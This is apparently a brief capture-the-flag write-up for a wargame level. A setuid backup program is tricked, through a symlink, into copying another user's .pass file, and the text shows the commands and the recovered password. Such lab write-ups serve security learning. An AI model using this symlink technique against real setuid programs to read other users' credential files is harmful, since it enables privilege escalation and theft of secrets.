# Search

```
$ ls -l
drwxrwx---+ 1 level09 users    60 Oct 19  2016 backups
-rwsr-s---+ 1 level09 users 12975 Oct 19  2016 level08

$ ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)

$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

after analyzing the executable and doing some test to open ```home/users/level09/.pass```
we saw that there is a problem with the absolute path. so i 'll do a link :

```
$ chmod 777 .

$ ln -s /home/users/level09/.pass toto

$ ./level08 toto

$ cat backups/toto 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```